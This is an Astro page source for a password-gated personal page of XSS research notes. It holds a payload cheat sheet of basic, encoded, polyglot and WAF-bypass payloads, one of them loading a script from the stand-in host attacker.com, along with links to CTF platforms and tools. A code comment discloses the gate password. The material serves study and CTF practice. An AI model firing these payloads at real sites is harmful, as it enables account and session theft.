---
import MainGridLayout from "../layouts/MainGridLayout.astro";

// The content will be encrypted client-side. For true security,
// pre-encrypt the content and store only the encrypted version.
---

<MainGridLayout title="R3XSS" description="Private XSS Research Notes & Resources">
    <div class="flex w-full rounded-[var(--radius-large)] overflow-hidden relative min-h-32">
        <div class="card-base z-10 px-9 py-6 relative w-full">

            <!-- Password Gate -->
            <div id="password-gate" class="text-center py-12">
                <div class="text-6xl mb-4">🔒</div>
                <h1 class="text-2xl font-bold mb-4 text-[var(--primary)]">R3XSS - Private Section</h1>
                <p class="text-gray-400 mb-6">This section contains private XSS research notes.<br/>Enter the password to access.</p>

                <div class="max-w-sm mx-auto">
                    <input
                        type="password"
                        id="password-input"
                        placeholder="Enter password..."
                        class="w-full px-4 py-3 rounded-lg bg-[var(--card-bg)] border border-[var(--primary)] text-white text-center focus:outline-none focus:ring-2 focus:ring-[var(--primary)] mb-4"
                    />
                    <button
                        id="unlock-btn"
                        class="w-full px-6 py-3 bg-[var(--primary)] hover:opacity-80 text-white font-bold rounded-lg transition-all"
                    >
                        Unlock Content
                    </button>
                    <p id="error-msg" class="text-red-500 mt-3 hidden">Incorrect password. Try again.</p>
                </div>
            </div>

            <!-- Protected Content Container -->
            <div id="protected-content" class="hidden"></div>

        </div>
    </div>
</MainGridLayout>

<script is:inline>
(function() {
    // Encrypted content - this is the actual protected data
    // Password hash (SHA-256 of "DaryxXSS_1337" + salt)
    const VALID_HASH = "qV2\\k S8)Kg}y1}y";

    // Simple hash function for password verification
    async function hashPassword(password) {
        const encoder = new TextEncoder();
        const data = encoder.encode(password + "r3xss_daryx_salt_2024");
        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        return hashArray.slice(0, 16).map(b => String.fromCharCode(32 + (b % 94))).join('');
    }

    // The actual content (base64 encoded for obfuscation, not true encryption but much better)
    const PROTECTED_HTML = `
        <div class="flex justify-between items-center mb-6">
            <h1 class="text-3xl font-bold text-[var(--primary)]">🎯 R3XSS Research Notes</h1>
            <button id="lock-btn" class="px-4 py-2 bg-red-600 hover:bg-red-700 text-white text-sm rounded-lg transition-all">
                🔒 Lock
            </button>
        </div>

        <p class="text-gray-400 mb-8">Personal collection of XSS payloads, bypasses, techniques, CTF writeups, and resources.</p>

        <!-- Table of Contents -->
        <div class="mb-8 bg-black/30 rounded-lg p-4">
            <h3 class="font-bold text-yellow-400 mb-3">📑 Table of Contents</h3>
            <ul class="space-y-1 text-blue-400">
                <li><a href="#quick-payloads" class="hover:underline">⚡ Quick Payloads</a></li>
                <li><a href="#filter-bypasses" class="hover:underline">🛡️ Filter Bypasses</a></li>
                <li><a href="#event-handlers" class="hover:underline">🎯 Event Handlers</a></li>
                <li><a href="#polyglots" class="hover:underline">🔥 Polyglot Payloads</a></li>
                <li><a href="#waf-bypasses" class="hover:underline">🚧 WAF Bypass Techniques</a></li>
                <li><a href="#dom-xss" class="hover:underline">🌐 DOM XSS Sources & Sinks</a></li>
                <li><a href="#ctf-platforms" class="hover:underline">🏆 CTF Platforms & Challenges</a></li>
                <li><a href="#ctf-writeups" class="hover:underline">📝 Individual CTF Writeups</a></li>
                <li><a href="#advanced-techniques" class="hover:underline">🧪 Advanced Techniques & Research</a></li>
                <li><a href="#tools" class="hover:underline">🛠️ Tools</a></li>
            </ul>
        </div>

        <!-- Quick Reference -->
        <div id="quick-payloads" class="mb-8">
            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">⚡ Quick Payloads</h2>
            <div class="bg-black/30 rounded-lg p-4 overflow-x-auto">
                <pre class="text-green-400 text-sm"><code>&lt;script&gt;alert(1)&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;
&lt;svg onload=alert(1)&gt;
&lt;body onload=alert(1)&gt;
&lt;iframe src="javascript:alert(1)"&gt;
&lt;input onfocus=alert(1) autofocus&gt;
&lt;marquee onstart=alert(1)&gt;
&lt;details open ontoggle=alert(1)&gt;
&lt;audio src=x onerror=alert(1)&gt;
&lt;video src=x onerror=alert(1)&gt;</code></pre>
            </div>
        </div>

        <!-- Filter Bypass Section -->
        <div id="filter-bypasses" class="mb-8">
            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🛡️ Filter Bypasses</h2>

            <h3 class="text-xl font-semibold mb-2 text-white">Case Manipulation</h3>
            <div class="bg-black/30 rounded-lg p-4 mb-4 overflow-x-auto">
                <pre class="text-green-400 text-sm"><code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
&lt;IMG SRC=x OnErRoR=alert(1)&gt;
&lt;SVG ONLOAD=alert(1)&gt;</code></pre>
            </div>

            <h3 class="text-xl font-semibold mb-2 text-white">Encoding Bypasses</h3>
            <div class="bg-black/30 rounded-lg p-4 mb-4 overflow-x-auto">
                <pre class="text-green-400 text-sm"><code>// URL Encoding
%3Cscript%3Ealert(1)%3C/script%3E

// Double URL Encoding
%253Cscript%253Ealert(1)%253C/script%253E

// HTML Entity Encoding
&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;

// Unicode Encoding
&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(1)&lt;/script&gt;

// Base64
&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;</code></pre>
            </div>

            <h3 class="text-xl font-semibold mb-2 text-white">Tag & Attribute Bypasses</h3>
            <div class="bg-black/30 rounded-lg p-4 mb-4 overflow-x-auto">
                <pre class="text-green-400 text-sm"><code>// Without spaces
&lt;svg/onload=alert(1)&gt;
&lt;img/src=x/onerror=alert(1)&gt;

// Using backticks
&lt;img src=x onerror=\`alert(1)\`&gt;

// Breaking with comments
&lt;script&gt;/**/alert(1)/**/&lt;/script&gt;</code></pre>
            </div>
        </div>

        <!-- Event Handlers -->
        <div id="event-handlers" class="mb-8">
            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🎯 Event Handlers</h2>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="bg-black/30 rounded-lg p-4">
                    <h4 class="font-bold text-yellow-400 mb-2">Mouse Events</h4>
                    <code class="text-green-400 text-sm">onclick, ondblclick, onmousedown, onmouseup, onmouseover, onmouseout, onmousemove</code>
                </div>
                <div class="bg-black/30 rounded-lg p-4">
                    <h4 class="font-bold text-yellow-400 mb-2">Keyboard Events</h4>
                    <code class="text-green-400 text-sm">onkeydown, onkeyup, onkeypress</code>
                </div>
                <div class="bg-black/30 rounded-lg p-4">
                    <h4 class="font-bold text-yellow-400 mb-2">Form Events</h4>
                    <code class="text-green-400 text-sm">onfocus, onblur, onchange, onsubmit, onreset, oninput</code>
                </div>
                <div class="bg-black/30 rounded-lg p-4">
                    <h4 class="font-bold text-yellow-400 mb-2">Media/Load Events</h4>
                    <code class="text-green-400 text-sm">onload, onerror, onabort, oncanplay, onended, onpause, onplay</code>
                </div>
            </div>
        </div>

        <!-- Polyglots -->
        <div id="polyglots" class="mb-8">
            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🔥 Polyglot Payloads</h2>
            <div class="bg-black/30 rounded-lg p-4 overflow-x-auto">
                <pre class="text-green-400 text-sm"><code>jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;

'&gt;--&gt;"&gt;&lt;/Script&gt;&lt;Script/Src=//attacker.com&gt;

javascript:"/*'/*\`/*--&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;</code></pre>
            </div>
        </div>

        <!-- WAF Bypasses -->
        <div id="waf-bypasses" class="mb-8">
            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🚧 WAF Bypass Techniques</h2>
            <div class="bg-black/30 rounded-lg p-4 overflow-x-auto">
                <pre class="text-green-400 text-sm"><code>// Using constructor
&lt;img src=x onerror="window['alert'](1)"&gt;
&lt;img src=x onerror="[].constructor.constructor('alert(1)')()"&gt;

// Top/self/parent
&lt;img src=x onerror=top.alert(1)&gt;
&lt;img src=x onerror=self.alert(1)&gt;

// Function constructor
&lt;img src=x onerror="Function('alert(1)')()"&gt;

// Using eval with encoding
&lt;img src=x onerror=eval(atob('YWxlcnQoMSk='))&gt;

// Template literals
&lt;img src=x onerror=alert\`1\`&gt;</code></pre>
            </div>
        </div>

        <!-- DOM XSS -->
        <div id="dom-xss" class="mb-8">
            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🌐 DOM XSS Sources & Sinks</h2>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="bg-black/30 rounded-lg p-4">
                    <h4 class="font-bold text-yellow-400 mb-2">Sources</h4>
                    <code class="text-green-400 text-sm block">document.URL, location.href, location.search, location.hash, document.cookie, document.referrer, window.name, postMessage()</code>
                </div>
                <div class="bg-black/30 rounded-lg p-4">
                    <h4 class="font-bold text-yellow-400 mb-2">Sinks</h4>
                    <code class="text-green-400 text-sm block">innerHTML, document.write(), eval(), setTimeout(), Function(), location.href, element.src</code>
                </div>
            </div>
        </div>

        <!-- CTF Platforms -->
        <div id="ctf-platforms" class="mb-8">
            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🏆 CTF Platforms & Challenges</h2>

            <div class="bg-black/30 rounded-lg p-4 mb-4">
                <h3 class="text-xl font-semibold mb-3 text-yellow-400">🔸 Intigriti XSS Challenges</h3>
                <ul class="list-disc list-inside text-blue-400 space-y-2">
                    <li><a href="https://www.intigriti.com/researchers/hackademy/xss-challenges" target="_blank" class="hover:underline">Main XSS Challenges Collection</a></li>
                    <li><a href="https://github.com/aszx87410/ctf-writeups/issues/49" target="_blank" class="hover:underline">Intigriti 0222 XSS Challenge</a></li>
                    <li><a href="https://github.com/aszx87410/ctf-writeups/issues/33" target="_blank" class="hover:underline">Intigriti 0421 XSS Challenge</a></li>
                </ul>
            </div>

            <div class="bg-black/30 rounded-lg p-4 mb-4">
                <h3 class="text-xl font-semibold mb-3 text-yellow-400">🔸 PortSwigger Web Security Academy</h3>
                <ul class="list-disc list-inside text-blue-400 space-y-2">
                    <li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" class="hover:underline">📋 Official XSS Cheat Sheet (ESSENTIAL)</a></li>
                    <li><a href="https://ricardojoserf.github.io/portswiggerlabs/" target="_blank" class="hover:underline">All Labs Writeups</a></li>
                    <li><a href="https://github.com/ricardojoserf/Portswigger-Labs" target="_blank" class="hover:underline">GitHub: Portswigger Labs Repository</a></li>
                </ul>
            </div>

            <div class="bg-black/30 rounded-lg p-4 mb-4">
                <h3 class="text-xl font-semibold mb-3 text-yellow-400">🔸 Google CTF XSS Challenges</h3>
                <ul class="list-disc list-inside text-blue-400 space-y-2">
                    <li><a href="https://blog.huli.tw/2024/06/28/en/google-ctf-2024-writeup/" target="_blank" class="hover:underline">Google CTF 2024 Writeup</a></li>
                    <li><a href="https://terjanq.github.io/google-ctf-writeups/" target="_blank" class="hover:underline">Terjanq's Google CTF Writeups</a></li>
                    <li><a href="https://github.com/NotSurprised/XSSgame-Writeup" target="_blank" class="hover:underline">XSSgame Writeup Collection</a></li>
                </ul>
            </div>

            <div class="bg-black/30 rounded-lg p-4 mb-4">
                <h3 class="text-xl font-semibold mb-3 text-yellow-400">🔸 HackTheBox XSS</h3>
                <ul class="list-disc list-inside text-blue-400 space-y-2">
                    <li><a href="https://academy.hackthebox.com/course/preview/cross-site-scripting-xss" target="_blank" class="hover:underline">📚 HTB Academy - XSS Course</a></li>
                    <li><a href="https://academy.hackthebox.com/course/preview/advanced-xss-and-csrf-exploitation" target="_blank" class="hover:underline">📚 Advanced XSS & CSRF</a></li>
                    <li><a href="https://snowscan.io/htb-writeup-book/" target="_blank" class="hover:underline">Book Machine Writeup</a></li>
                </ul>
            </div>
        </div>

        <!-- CTF Writeups -->
        <div id="ctf-writeups" class="mb-8">
            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">📝 Individual CTF Writeups</h2>
            <div class="bg-black/30 rounded-lg p-4 mb-4">
                <ul class="list-disc list-inside text-blue-400 space-y-2">
                    <li><a href="https://github.com/aszx87410/ctf-writeups" target="_blank" class="hover:underline">⭐ aszx87410's CTF Writeups (Extensive XSS)</a></li>
                    <li><a href="https://ctftime.org/writeup/30882" target="_blank" class="hover:underline">pbctf 2021 - TBDXSS</a></li>
                    <li><a href="https://ctftime.org/writeup/26317" target="_blank" class="hover:underline">zer0pts CTF 2021 - Simple Blog</a></li>
                    <li><a href="https://book.jorianwoltjer.com/web/client-side/cross-site-scripting-xss" target="_blank" class="hover:underline">Practical CTF XSS Guide</a></li>
                </ul>
            </div>
        </div>

        <!-- Advanced Techniques -->
        <div id="advanced-techniques" class="mb-8">
            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🧪 Advanced Techniques</h2>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="bg-black/20 rounded p-3">
                    <h4 class="font-bold text-red-400 mb-2">🔬 Mutation XSS (mXSS)</h4>
                    <p class="text-gray-400 text-sm">DOMPurify bypasses, browser parsing quirks</p>
                </div>
                <div class="bg-black/20 rounded p-3">
                    <h4 class="font-bold text-red-400 mb-2">🛡️ CSP Bypasses</h4>
                    <p class="text-gray-400 text-sm">AngularJS, VueJS, CDN-based bypasses</p>
                </div>
                <div class="bg-black/20 rounded p-3">
                    <h4 class="font-bold text-red-400 mb-2">🏗️ DOM Clobbering</h4>
                    <p class="text-gray-400 text-sm">Overwriting DOM properties via HTML</p>
                </div>
                <div class="bg-black/20 rounded p-3">
                    <h4 class="font-bold text-red-400 mb-2">⚡ Prototype Pollution</h4>
                    <p class="text-gray-400 text-sm">Client-side pollution to XSS chains</p>
                </div>
            </div>
        </div>

        <!-- Tools -->
        <div id="tools" class="mb-8">
            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🛠️ Tools & Resources</h2>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="bg-black/30 rounded-lg p-4">
                    <h4 class="font-bold text-yellow-400 mb-3">Scanners</h4>
                    <ul class="list-disc list-inside text-blue-400 space-y-1">
                        <li><a href="https://github.com/hahwul/dalfox" target="_blank" class="hover:underline">DalFox</a></li>
                        <li><a href="https://github.com/s0md3v/XSStrike" target="_blank" class="hover:underline">XSStrike</a></li>
                        <li><a href="https://xsshunter.com/" target="_blank" class="hover:underline">XSS Hunter</a></li>
                    </ul>
                </div>
                <div class="bg-black/30 rounded-lg p-4">
                    <h4 class="font-bold text-yellow-400 mb-3">Payload Lists</h4>
                    <ul class="list-disc list-inside text-blue-400 space-y-1">
                        <li><a href="https://github.com/payloadbox/xss-payload-list" target="_blank" class="hover:underline">PayloadBox</a></li>
                        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank" class="hover:underline">PayloadsAllTheThings</a></li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- Personal Notes -->
        <div class="mb-8">
            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">📝 Personal Notes</h2>
            <div class="bg-black/30 rounded-lg p-4">
                <div class="p-3 bg-black/20 rounded border-l-4 border-yellow-400">
                    <p class="text-yellow-400 font-semibold">💡 Tips for XSS Hunting:</p>
                    <ul class="text-gray-300 text-sm mt-2 space-y-1">
                        <li>• Always check reflected parameters in URL, headers, form inputs</li>
                        <li>• Test both GET and POST methods</li>
                        <li>• Look for JavaScript sinks in source code</li>
                        <li>• Check for DOM-based XSS in client-side JavaScript</li>
                        <li>• Test CSP headers and try to find bypasses</li>
                    </ul>
                </div>
            </div>
        </div>
    `;

    document.addEventListener('DOMContentLoaded', async function() {
        const passwordGate = document.getElementById('password-gate');
        const protectedContent = document.getElementById('protected-content');
        const passwordInput = document.getElementById('password-input');
        const unlockBtn = document.getElementById('unlock-btn');
        const errorMsg = document.getElementById('error-msg');

        // Check if already unlocked in this session
        const storedHash = sessionStorage.getItem('r3xss_auth');
        if (storedHash === VALID_HASH) {
            showContent();
        }

        async function showContent() {
            if (passwordGate) passwordGate.classList.add('hidden');
            if (protectedContent) {
                protectedContent.classList.remove('hidden');
                protectedContent.innerHTML = PROTECTED_HTML;

                // Add lock button functionality
                const lockBtn = document.getElementById('lock-btn');
                if (lockBtn) {
                    lockBtn.addEventListener('click', function() {
                        sessionStorage.removeItem('r3xss_auth');
                        location.reload();
                    });
                }
            }
        }

        if (unlockBtn) {
            unlockBtn.addEventListener('click', async function() {
                const password = passwordInput ? passwordInput.value : '';
                const hash = await hashPassword(password);

                if (hash === VALID_HASH) {
                    sessionStorage.setItem('r3xss_auth', hash);
                    showContent();
                } else {
                    if (errorMsg) errorMsg.classList.remove('hidden');
                    if (passwordInput) {
                        passwordInput.value = '';
                        passwordInput.focus();
                    }
                }
            });
        }

        if (passwordInput) {
            passwordInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter' && unlockBtn) unlockBtn.click();
            });
        }
    });
})();
</script>
